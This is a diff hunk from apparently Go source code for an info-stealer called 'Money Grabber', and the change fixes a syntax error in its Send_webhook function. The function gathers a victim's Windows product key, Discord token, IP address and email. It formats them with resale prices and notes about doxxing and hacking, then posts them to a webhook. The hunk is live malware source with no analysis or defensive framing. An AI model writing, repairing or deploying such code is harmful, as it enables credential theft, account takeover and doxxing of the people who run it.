@@ -158,7 +158,7 @@ func Get_email() string {
 }
 
 // runs all the functions to get info and sends it to webhook
-func Send_webhook(string webhook) {
+func Send_webhook(webhook string) {
 	info := "# :money_with_wings: Money Grabber :money_with_wings: " + "\n**Windows key** `" + Getkey() + "` - Can sell for *$0.99 - $9.99* :money_mouth: " + "\n**Token** ` " + Discord_stage() + " ` - Can sell for *$0.99 - $20.00* :money_mouth:" + "\n**IP** `" + Get_ip() + "` - Used for doxxing/hacking :wolf: " + "\n**Email** ` " + Get_email() + "` - Used for doxxing/hacking :brain: \n ||@everyone||"
 	
 	message := map[string]string{"content": info}
